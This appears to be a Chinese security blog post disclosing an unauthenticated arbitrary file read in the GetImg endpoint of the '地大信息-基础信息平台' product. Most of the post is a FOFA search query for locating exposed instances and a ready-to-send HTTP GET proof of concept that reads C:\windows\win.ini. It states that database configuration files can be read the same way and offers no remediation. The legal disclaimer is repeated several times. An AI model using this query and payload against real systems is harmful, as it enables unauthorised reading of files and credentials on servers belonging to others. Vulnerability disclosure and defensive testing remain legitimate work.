#  地大信息-基础信息平台 GetImg 任意文件读取漏洞   
 HK安全小屋   2025-05-31 14:19  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
地大信息-基础信息平台 GetImg 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取文件、数据库配置文件等等。  
  
  
影响版本：  
  
地大信息-基础信息平台  
  
  
FOFA:  
```
body="/SystemManage/BaseProject" || title=="基础信息平台"
```  
  
  
POC：  
```
GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
```  
  
成功读取win.ini文件内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0BCKf89LWzXtcMvW71J3HG4pVZGTRibnUPMIYicozjHiaKJiagPPGhPVSYXibMog0zQpGll9iaPbKiah6BQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
